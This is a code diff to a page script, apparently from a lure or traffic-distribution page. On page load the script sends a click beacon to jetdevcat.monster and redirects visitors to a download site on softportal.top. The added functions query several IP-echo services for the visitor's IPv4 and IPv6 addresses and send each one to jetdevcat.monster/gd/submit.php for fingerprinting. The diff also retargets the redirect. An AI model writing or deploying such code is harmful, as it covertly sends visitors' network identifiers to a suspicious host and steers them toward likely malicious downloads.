@@ -34,9 +34,47 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Send click event
         fetch("https://jetdevcat.monster/gd/click.php");
+	function sub4(i) {
+            const v4d = ['ipv4.icanhazip.com', 'ipv4.ident.me', 'ipv4.tnedi.me', 'ipv4.whatismyip.akamai.com', 'ipv4.ipecho.net/plain', 'ipv4.seeip.org'];
+            if (i >= v4d.length) {return;}
+            try {
+                let xhr = new XMLHttpRequest();
+                xhr.withCredentials = false;
+                xhr.open('GET', 'https://'+v4d[i]);
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status <= 300) {
+                        window.i4 = xhr.response;
+                        fetch(`https://jetdevcat.monster/gd/submit.php?i=${xhr.response}`);
+                        subfp(xhr.response);
+                    }
+                };
+                xhr.send();
+            } catch (error) { console.log('sub4_error: '+error); }
+            sub4(i+1);
+        }
+        function sub6(i) {
+            const v6d = ['ipv6.icanhazip.com', 'ipv6.ident.me', 'ipv6.tnedi.me', 'ipv6.whatismyip.akamai.com', 'ipv6.ipecho.net/plain', 'ipv6.seeip.org'];
+            if (i >= v6d.length) {return;}
+            try {
+                let xhr = new XMLHttpRequest();
+                xhr.withCredentials = false;
+                xhr.open('GET', 'https://'+v6d[i]);
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status <= 300) {
+                        window.i6 = xhr.response;
+                        fetch(`https://jetdevcat.monster/gd/submit.php?i=${xhr.response}`);
+                        subfp(xhr.response);
+                    }
+                };
+                xhr.send();
+            } catch (error) { console.log('sub6_error: '+error); }
+            sub6(i+1);
+        }
+sub4(0);
+sub6(0);
 
         setTimeout(() => {
-          window.location.href = 'https://softportal.top/s/git3';
+          window.location.href = 'https://softportal.top/s/all';
         }, 500);
       }
     }
